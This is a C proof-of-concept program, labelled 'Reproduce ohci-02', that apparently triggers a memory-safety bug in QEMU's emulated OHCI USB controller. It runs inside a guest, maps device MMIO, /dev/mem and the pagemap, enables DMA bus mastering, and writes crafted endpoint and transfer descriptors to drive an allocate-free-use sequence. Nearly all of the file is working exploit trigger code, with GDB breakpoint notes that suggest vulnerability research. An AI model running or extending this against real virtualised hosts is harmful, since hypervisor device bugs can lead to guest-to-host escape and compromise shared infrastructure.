#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <time.h>

uint8_t *mmio_mem;
uint8_t *config_mem;
uint8_t *devmem_mem;

void die(const char *msg) {
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr) {
    return *((uint32_t *)(mmio_mem + addr));
}

void config_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(config_mem + addr)) = value;
}

uint32_t config_read(uint32_t addr) {
    return *((uint32_t *)(config_mem + addr));
}

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)
int pagemap_fd;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    uint64_t offset;
    offset = ((uint64_t)addr >> 12) << 3;
    lseek(pagemap_fd, offset, SEEK_SET);
    read(pagemap_fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    printf("[+] gva_to_gfn 0x%lx -> 0x%lx\n", pme, gfn);
    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    if (gfn == -1)
        die("[-] Physical page not present.\n");
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

void *calloc_256aligned(size_t size) {
    void *ptr_virt = mmap(0, size + 256, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (ptr_virt == MAP_FAILED)
        die("[-] Mmap 256aligned buffer failed.\n");
    mlock(ptr_virt, size + 256);
    uint64_t ptr_phys = gva_to_gpa(ptr_virt);
    uint64_t __ptr_phys = (ptr_phys + 0xff) & (~(uint64_t)0xff);
    return (void *)((uint64_t)ptr_virt + (__ptr_phys - ptr_phys));
}

//
// OHCI specific structs
//
typedef struct ohci_hcca {
    uint32_t intr[32];
    uint16_t frame, pad;
    uint32_t done;
} ohci_hcca;

typedef struct ohci_ed {
    uint32_t flags;
    uint32_t tail;
    uint32_t head;
    uint32_t next;
} ohci_ed;

typedef struct ohci_td {
    uint32_t flags;
    uint32_t cbp;
    uint32_t next;
    uint32_t be;
} ohci_td;

typedef struct ohci_iso_td {
    uint32_t flags;
    uint32_t bp;
    uint32_t next;
    uint32_t be;
    uint16_t offset[8];
} ohci_iso_td;

static void craft_hcca0_intr0(ohci_hcca *hcca) {
    ohci_ed *ed0 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
    uint64_t ed0_phys = gva_to_gpa(ed0);
    ohci_ed *ed1 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
    uint64_t ed1_phys = gva_to_gpa(ed1);

    ohci_td *td0 = (ohci_td *)calloc_256aligned(sizeof(ohci_td));
    uint64_t td0_phys = gva_to_gpa(td0);

    uint32_t *cbw = (uint32_t *)calloc_256aligned(0x20);
    cbw[0] = 0x43425355;
    cbw[1] = 0x00000000;
    cbw[2] = 0x00000000;
    cbw[3] = 0x03000000;
    cbw[4] = 0x81ea9dd0;
    cbw[5] = 0x81ea9dd0;
    cbw[6] = 0x81ea9dd0;
    cbw[7] = 0x00ea9dd0;
    uint64_t cbw_phys = gva_to_gpa(cbw);

    td0->flags = 0xb548ffdd;
    td0->cbp = cbw_phys;
    td0->be = cbw_phys + 0x1f - 1;

    ed0->flags = 0xda9d3900;
    ed0->next = (uint32_t)ed1_phys;
    ed0->head = (uint32_t)td0_phys;

    hcca->intr[0] = ed0_phys;
}

static void craft_hcca0_intr1(ohci_hcca *hcca) {
    ohci_ed *ed0 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
    uint64_t ed0_phys = gva_to_gpa(ed0);
    ohci_ed *ed1 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
    uint64_t ed1_phys = gva_to_gpa(ed1);

    ohci_td *td0 = (ohci_td *)calloc_256aligned(sizeof(ohci_td));
    uint64_t td0_phys = gva_to_gpa(td0);

    uint32_t *cbw = (uint32_t *)calloc_256aligned(0xe28);
    uint64_t cbw_phys = gva_to_gpa(cbw);

    td0->flags = 0x0;
    td0->cbp = cbw_phys;
    td0->be = cbw_phys + 0xe28 - 1;

    ed0->flags = 0x1a31080;
    ed0->next = (uint32_t)ed1_phys;
    ed0->head = (uint32_t)td0_phys;

    hcca->intr[1] = ed0_phys;
}

static void craft_hcca0_intr2(ohci_hcca *hcca) {
    ohci_ed *ed0 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
    uint64_t ed0_phys = gva_to_gpa(ed0);

    ohci_iso_td *iso_td0 = (ohci_iso_td *)calloc_256aligned(sizeof(ohci_iso_td));
    uint64_t iso_td0_phys = gva_to_gpa(iso_td0);

    iso_td0->flags = 0xa4200000;
    iso_td0->bp = 0x22a2edc3;
    iso_td0->be = 0x1173548;
    iso_td0->offset[2] = 0x749b;
    iso_td0->offset[3] = 0xcbe3;

    ed0->flags = 0xadb9080;
    ed0->head = (uint32_t)iso_td0_phys;

    hcca->intr[2] = ed0_phys;
}

int main(int argc, char **argv) {
    printf("[+]\n[+] Reproduce ohci-02: start\n[+]\n");

    // lspci -v and we will get ohci's pci address
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("[-] Open mmio_fd failed.\n");
    printf("[+] Open mmio_fd successful.\n");
    mmio_mem = mmap(0, 0x100, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("[-] Mmap mmio_mem failed.\n");
    printf("[+] Mmap mmio_mem at %p.\n", mmio_mem);

    pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap_fd < 0)
        die("[-] Open pagemap failed.\n");
    printf("[+] Open pagemap successful.\n");

    int devmem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    devmem_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, devmem_fd, 0);
    if (devmem_mem == MAP_FAILED)
        die("[-] Mmap devmem_mem failed.\n");
    printf("[+] Mmap devmem_mem at %p.\n", devmem_mem);

    // we want to enable the bus master bit to enable DMA
    iopl(3);
    uint32_t command_address;
    uint32_t command_status;
    command_address = 0x80000000 | 0x0000 << 16 | 0x03 << 11 | 0x0 << 8 | 0x04;
    // read
    outl(command_address, 0xcf8);
    command_status = inl(0xcfc);
    printf("[+] ohci PCI_CONFIG.Command = 0x%x\n", (uint16_t)command_status);
    // write
    command_status |= 0x4;
    outl(command_address, 0xcf8);
    outl(command_status, 0xcfc);
    // read
    outl(command_address, 0xcf8);
    command_status = inl(0xcfc);
    printf("[+] ohci PCI_CONFIG.Command = 0x%x\n", (uint16_t)command_status);
    sleep(1);

    // GDB
    // gef config context.nb_lines_backtrace 2
    // b ../hw/usb/hcd-ohci.c:1591
    // b ohci_child_detach
 
    ohci_hcca *hcca0 = (ohci_hcca *)calloc_256aligned(sizeof(ohci_hcca));
    craft_hcca0_intr0(hcca0); // prepare
    craft_hcca0_intr1(hcca0); // prepare
    craft_hcca0_intr2(hcca0); // allocate and free
    uint64_t hcca0_phys = gva_to_gpa(hcca0);

    // step 1: make dev-storage USB_MSDM_CSW
    mmio_write(0x8, 0x1);
    mmio_write(0x54, 0x0f5a8a46);
    mmio_write(0xc, 0x14b7f9fc);
    mmio_write(0x18, hcca0_phys);
    mmio_write(0x4, 0x33161e26 | 0x80);
    sleep(1);
    mmio_write(0x4, 0x33161e26 | 0xc0);
    mmio_write(0x4, 0x4993d90b); // use

    printf("[+]\n[+] Reproduce ohci-02: fail\n[+]\n");

    return 0;
}
